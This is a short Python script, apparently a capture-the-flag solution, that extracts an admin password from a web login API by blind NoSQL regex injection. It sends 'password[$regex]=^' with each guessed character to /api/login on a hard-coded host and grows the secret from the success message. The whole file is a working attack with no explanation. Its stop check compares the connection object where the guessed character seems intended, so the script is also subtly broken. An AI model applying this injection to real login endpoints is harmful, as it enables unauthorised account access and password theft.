import http.client,string,json,urllib.parse

username = "admin"
password = "CHTB{"

rhost_ip = '46.101.22.121'
rhost_port = 30748
exe = True
while exe:
    for char in string.printable:
        if char in ['*', '+', '.', '?', '|', '&']:
            continue
        c = "C"
        headers = {
                "Content-Type": "application/x-www-form-urlencoded"
        }
        body = 'username='+username+'&password[$regex]=^'+password+char
        c = http.client.HTTPConnection(rhost_ip, rhost_port)
        c.request('POST', '/api/login', body, headers)
        r = c.getresponse().read()

        r_json = json.loads(r)

        if r_json["message"] == "Login Successful, welcome back admin.":
            print(char)
            password = password + char
            print(password)
            if c == '}':
                exe = False
            break